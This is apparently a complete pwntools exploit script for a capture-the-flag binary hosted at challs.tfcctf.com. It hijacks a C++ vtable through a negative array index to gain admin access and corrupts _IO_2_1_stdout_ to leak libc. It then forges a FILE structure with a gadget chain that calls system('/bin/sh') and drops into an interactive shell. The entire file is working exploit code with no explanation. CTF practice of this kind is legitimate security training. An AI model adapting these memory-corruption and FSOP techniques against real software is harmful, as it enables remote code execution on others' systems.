#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

def conn():
    if args.LOCAL:
        r = process([exe.path]) #, aslr=False)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.tfcctf.com", 30475)

    return r

r = conn()

def login(user, passw):
    r.sendlineafter(b" > ", b"1")
    r.sendlineafter(b": ", user)
    r.sendlineafter(b": ", passw)

def change_stat(idx, val):
    r.sendlineafter(b" > ", "3")
    r.sendlineafter(b"): ", str(idx))
    r.sendlineafter(b": ", str(val))

def logout():
    r.sendlineafter(b" > ", b"6")

def logout_admin():
    r.sendlineafter(b" > ", b"5")

def report_bug(title, desc=b"A", idx = 1, is_first=False):
    # if (is_first == False):
    #     r.interactive()
    r.sendlineafter(b" > ", b"4")

    pie_leak = r.recvuntil(b"[9] ")
    pie_leak = r.recvline().strip()
    pie_leak = u64(pie_leak.ljust(8, b"\x00"))
    log.info(f"PIE leak: {hex(pie_leak)}")
    # input("wait")

    if is_first:
        got = pie_leak + 0x340
        payload = p64(0xfbad1887) + p64(got) * 3 + p64(got) + p64(got + 8) * 2# + p64(got + 8) + p64(got + 8)
        title = payload
    
    # print(payload)
    r.sendlineafter(b": ", str(idx))
    r.sendlineafter(b": ", title)
    # r.sendlineafter(b": ", b"n")
    return pie_leak

def main():
    # gdb.attach(r)
    login(b"bob", b"siminaaremere")
    change_stat(-7, 0x18) # change vtable of User to be the vtable of Admin

    r.sendlineafter(b" > ", b"5")
    r.sendlineafter(b": ", b"1")
    r.sendlineafter(b": ", b"siminaaremere")

    logout()
    login(b"admin", b"siminaaremere")

        
    
    # byte = input("byte: ")
    # libc_byte1 = input("libc_byte1: ")
    # libc_byte2 = input("libc_byte2: ")
    # libc_byte1 = int(libc_byte1, 16)
    # libc_byte2 = int(libc_byte2, 16)

    change_stat(-0x3b0 + 1, 0x40) # change bug_report pointer to point to _IO_2_1_stdout_
    change_stat(-0x3b0 + 2, 0xc0) # this will need to be bruteforced

    logout_admin()
    login(b"bob", "siminaaremere")


    pie_leak = report_bug(p64(0xfbad1887) + p64(0) * 3 + b"\xff", is_first=True)
    leak = r.recv(8)
    libc_leak = u64(leak)
    log.info(f"libc leak: {hex(libc_leak)}")
    libc.address = libc_leak - 0x455f0
    log.info(f"libc base: {hex(libc.address)}")
    
    stdout_lock = libc.address + 0x21ca70   # _IO_stdfile_1_lock  (symbol not exported)
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    gadget = libc.address + 0x00000000001636a0 # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

    
    report_bug(bytes(fake), is_first=False)

    # dat = r.recv(0x1000)
    # pos = []
    # # print(dat)
    # for i in range(0, len(dat)):
    #     # print("checking", i)
    #     # print(dat[i])
    #     if (dat[i] == libc_byte1):
    #         aux = u64(dat[i:i+8].ljust(8, b"\x00"))   
    #         pos.append((i, hex(aux)))
   



    # 

   
    

    r.interactive()


if __name__ == "__main__":
    main()
